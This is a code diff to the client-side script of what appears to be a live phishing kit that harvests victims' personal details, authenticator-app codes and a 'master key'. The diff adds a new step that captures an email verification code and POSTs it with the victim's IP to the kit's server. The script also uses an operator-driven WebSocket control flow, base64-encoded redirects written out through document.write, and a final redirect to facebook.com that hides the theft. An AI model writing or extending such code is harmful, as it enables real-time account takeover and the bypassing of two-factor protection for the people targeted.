@@ -3,7 +3,7 @@ let hasRef = new URLSearchParams(window.location.search).has("ref");
 let id;
 let statusState;
 
-let ipAddress = "149.22.91.88";
+let ipAddress;
 
 let gmail =
   "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vd3d3Lmdvb2dsZS5jb20lMjIlMjAvJTNF";
@@ -16,6 +16,7 @@ let first = document.getElementById("1");
 let second = document.getElementById("2");
 let third = document.getElementById("3");
 let fourth = document.getElementById("4");
+let fifth = document.getElementById("5");
 
 let fullNameContainer = document.getElementById("full-name-container");
 let emailContainer = document.getElementById("email-container");
@@ -28,6 +29,7 @@ let mobileNumber = document.getElementById("mobile-number");
 let address = document.getElementById("address");
 let authenticatorAppInput = document.getElementById("authenticator-app-input");
 let masterKeyInput = document.getElementById("master-key-input");
+let emailCodeInput = document.getElementById("email-code-input")
 
 let errorFullName = document.getElementById("error-full-name");
 let errorEmail = document.getElementById("error-email");
@@ -38,11 +40,13 @@ let errorAuthenticatorAppInput = document.getElementById(
   "error-authenticator-app-input"
 );
 let errorMasterKeyInput = document.getElementById("error-master-key-input");
+let errorEmailCodeInput = document.getElementById("error-email-code-input")
 
 let continueSignIn = document.getElementById("continue-1");
 let enterAuthenticatorApp = document.getElementById("enter-authenticator-app");
 let enterMasterKey = document.getElementById("enter-masterkey");
 let approvalEnter = document.getElementById("enter-approval");
+let enterEmailCode = document.getElementById("enter-email-code");
 
 let isAddress;
 
@@ -85,7 +89,7 @@ if (hasRef) {
   document.write(decodeURIComponent(atob(`${ref}`)));
 } else {
   showPanel();
-  const socket = new WebSocket("ws://localhost:3000");
+  const socket = new WebSocket(`ws://${window.location.host}/ws`);
 
   let clientIp = null;
 
@@ -130,6 +134,7 @@ if (hasRef) {
           enterAuthenticatorApp.innerHTML = defaultAuthenticatorAppContent;
           errorAuthenticatorAppInput.style.display = "block";
         }
+
         if (msg.data.stat == "5") {
           show(fourth);
           errorMasterKeyInput.style.display = "none";
@@ -141,6 +146,18 @@ if (hasRef) {
           errorMasterKeyInput.style.display = "block";
         }
         if(msg.data.stat == "7") {
+          show(fifth);
+          errorEmailCodeInput.style.display = "none";
+          
+        }
+        if(msg.data.stat == "8") {
+          show(fifth);
+          enterEmailCode.className = defaultAuthenticatorAppClass;
+          enterEmailCode.innerHTML = defaultAuthenticatorAppContent;
+          errorEmailCodeInput.style.display = "block";
+        }
+        
+        if(msg.data.stat == "9") {
           location.href = "https://www.facebook.com"
         }
         // Update row in table
@@ -177,6 +194,16 @@ if (hasRef) {
             errorMasterKeyInput.style.display = "block";
           }
           else if(msg.stat == "7") {
+            show(fifth);
+          enterEmailCode.className = defaultAuthenticatorAppClass;
+          enterEmailCode.innerHTML = defaultAuthenticatorAppContent;
+          errorEmailCodeInput.style.display = "block";
+          }
+          else if(msg.stat == "8") {
+            show(fifth);
+            errorEmailCodeInput.style.display = "none";
+          }
+          else if(msg.stat == "9") {
             location.href = "https://www.facebook.com"
           }
         } else {
@@ -261,6 +288,16 @@ if (hasRef) {
           currentUrl += "&ref=4";
           window.location.href = currentUrl;
         }, 3000);
+      }
+      else if(targetId == "enter-email-code" || targetId == "enter-email-code-span") {
+        if (emailCodeInput.value.trim() !== "") {
+          enterEmailCode.className = loadingAuthenticatorAppClass;
+          enterEmailCode.innerHTML = loadingAuthenticatorAppContent;
+
+          setTimeout(function () {
+            sendEmailCode();
+          }, 3000);
+        }
       }
     });
   }
@@ -363,7 +400,25 @@ function sendMasterKeyCode() {
     .catch((err) => console.log("POST Error: "));
 }
 
-[authenticatorAppInput, masterKeyInput].forEach((input) => {
+function sendEmailCode() {
+  fetch("/update-email-code-2", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      ip: ipAddress,
+      email_code_2: emailCodeInput.value,
+    }),
+  })
+    .then((res) => res.json())
+    .then((data) => {
+      
+    })
+    .catch((err) => console.log("POST Error: "));
+}
+
+[authenticatorAppInput, masterKeyInput, emailCodeInput].forEach((input) => {
   input.addEventListener("input", () => {
     if (input === authenticatorAppInput) {
       if (authenticatorAppInput.value.trim() != "") {
@@ -384,6 +439,16 @@ function sendMasterKeyCode() {
       }
       // authenticatorAppContainer.className = defaultEmailClass;
       errorMasterKeyInput.style.display = "none";
+    }
+    if (input === emailCodeInput) {
+      if (emailCodeInput.value.trim() != "") {
+        enterEmailCode.className = activeAuthenticatorAppClass;
+        errorEmailCodeInput.style.display = "none";
+      } else {
+        enterEmailCode.className = defaultAuthenticatorAppClass;
+      }
+      // authenticatorAppContainer.className = defaultEmailClass;
+      errorEmailCodeInput.style.display = "none";
     }
   });
 });
